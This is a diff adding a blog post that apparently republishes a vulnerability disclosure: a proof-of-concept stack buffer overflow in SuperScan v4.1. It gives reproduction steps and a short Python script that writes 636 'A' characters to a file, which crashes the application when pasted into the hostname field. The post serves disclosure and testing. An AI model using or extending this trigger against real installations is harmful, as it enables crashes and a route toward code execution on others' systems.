@@ -1,0 +1,38 @@
+---
+layout: post
+title: SuperScan v4.1 - Stack Buffer Overflow (PoC)
+date: 2023-09-18
+category: exploit
+---
+
+# Exploit Title: SuperScan v4.1 - Stack Buffer Overflow (PoC)
+# Discovered by: Ahmet Ümit BAYRAM
+# Discovered Date: 18.09.2023
+# Vendor: Foundstone Inc
+# Software Link: https://delivery2.filecroco.com/kits_6/superscan-4.1.zip
+# Tested Version: v4.1 (latest)
+# Tested on: Windows 2019 Server 64bit
+
+### Steps to Reproduce
+
+1. Open the SuperScan application.
+2. Paste the content of the `poc.txt` file into the “Hostname / IP” box.
+3. Click the arrow right next to the box.
+4. Application crashes, demonstrating the stack buffer overflow.
+
+### Proof of Concept (PoC)
+
+The following script generates a `poc.txt` file that, when loaded into SuperScan, triggers the buffer overflow.
+
+```python
+#!/usr/bin/python
+
+poc = 'A' * 636
+
+try:
+    file = open("poc.txt", "w")
+    file.write(poc)
+    file.close()
+    print("POC is created")
+except Exception as e:
+    print("POC is not created:", e)
